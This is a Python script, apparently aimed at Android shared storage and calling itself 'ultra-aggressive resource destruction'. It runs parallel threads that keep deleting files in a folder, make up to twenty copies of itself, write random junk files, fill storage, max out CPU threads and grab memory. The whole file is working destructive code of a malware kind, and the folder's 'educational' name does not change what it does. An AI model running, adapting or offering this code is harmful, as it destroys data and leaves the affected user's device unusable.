import os
import time
import threading
import shutil
import psutil
import random

# --- Highly Aggressive Configuration ---
STORAGE_FILL_CHUNK_SIZE = 5 * 1024 * 1024  # 5MB per file
MAX_STORAGE_FILES = 500
CPU_THREADS = 8  # More threads for max CPU load
BASE_DIR = "/storage/emulated/0/educational_folder"
REPLICA_LIMIT = 20

script_path = os.path.realpath(__file__)

if not os.path.exists(BASE_DIR):
    os.makedirs(BASE_DIR)

# Delete files aggressively
def delete_files():
    while True:
        for filename in os.listdir(BASE_DIR):
            file_path = os.path.join(BASE_DIR, filename)
            try:
                if os.path.isfile(file_path):
                    os.remove(file_path)
                    print(f"[Delete] Removed {file_path}")
            except Exception as e:
                print(f"[Delete Error] {file_path}: {e}")
        time.sleep(0.2)

# Self-replication
def replicate():
    count = 0
    while count < REPLICA_LIMIT:
        new_name = os.path.join(BASE_DIR, f"self_copy_{count}.py")
        try:
            shutil.copy(script_path, new_name)
            print(f"[Replicate] Created {new_name}")
            count += 1
        except Exception as e:
            print(f"[Replication Error] {e}")
        time.sleep(15)

# Overwrite with junk
def overwrite_with_junk():
    count = 0
    while True:
        filename = os.path.join(BASE_DIR, f"junk_{count}.bin")
        try:
            with open(filename, "wb") as f:
                f.write(os.urandom(10 * 1024 * 1024))  # 10MB junk
            print(f"[Junk] Wrote {filename}")
            count += 1
        except Exception as e:
            print(f"[Junk Write Error] {e}")
        time.sleep(0.2)

# Fill storage rapidly
def fill_storage():
    count = 0
    while True:
        filename = os.path.join(BASE_DIR, f"dummy_{count}.bin")
        try:
            with open(filename, "wb") as f:
                f.write(os.urandom(STORAGE_FILL_CHUNK_SIZE))
            count += 1
            if count % 20 == 0:
                print(f"[Storage] Created {count} files")
        except Exception as e:
            print(f"[Storage Error] {e}")
        time.sleep(0.05)

# Stress CPU heavily
def stress_cpu():
    def cpu_burn():
        while True:
            x = 0
            for i in range(200000):
                x += (i ** 2) * random.random()
    for _ in range(CPU_THREADS):
        t = threading.Thread(target=cpu_burn)
        t.daemon = True
        t.start()

# Additional RAM overload
def overload_ram():
    large_list = []
    while True:
        try:
            # Append large byte arrays to consume RAM
            large_list.append(os.urandom(1024 * 1024))  # 1MB chunks
            if len(large_list) > 50:
                large_list = large_list[-50:]  # Keep last 50MB
            time.sleep(0.1)
        except:
            pass

def main():
    print("[Start] Ultra-aggressive resource destruction")
    threading.Thread(target=delete_files, daemon=True).start()
    threading.Thread(target=replicate, daemon=True).start()
    threading.Thread(target=overwrite_with_junk, daemon=True).start()
    threading.Thread(target=fill_storage, daemon=True).start()
    threading.Thread(target=stress_cpu, daemon=True).start()
    threading.Thread(target=overload_ram, daemon=True).start()

    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("[Stop] User interrupted")

if __name__ == "__main__":
    main()
